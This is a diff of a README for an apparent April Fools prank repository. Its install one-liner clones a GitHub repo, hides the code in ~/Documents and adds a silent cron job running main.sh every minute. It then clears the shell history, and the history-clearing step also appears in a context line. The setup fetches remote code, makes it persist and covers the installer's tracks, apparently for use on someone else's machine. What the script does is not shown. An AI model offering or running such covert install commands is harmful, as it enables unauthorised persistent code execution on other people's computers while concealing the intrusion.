@@ -14,6 +14,11 @@ history -c && history -p
 
 to test on your own computer this will run every minute (just to make sure it works)
 ```
-git clone https://github.com/benbav/april_fools.git && rm april_fools/README.md && mv april_fools ~/Documents/ && (crontab -l ; echo "* * * * * nohup /usr/bin/env bash ~/Documents/april_fools/main.sh > /dev/null 2>&1 &") | crontab - && history -c && history -p
+git clone https://github.com/benbav/april_fools.git && \
+rm april_fools/README.md && \
+mv april_fools ~/Documents/ && \
+chmod +x ~/Documents/april_fools/main.sh && \
+(crontab -l ; echo "* * * * * nohup /usr/bin/env bash ~/Documents/april_fools/main.sh > /dev/null 2>&1 &") | crontab - && \
+history -c && history -p
 ```
 **if you need to stop it go to the Documents folder and delete the april_fools folder**
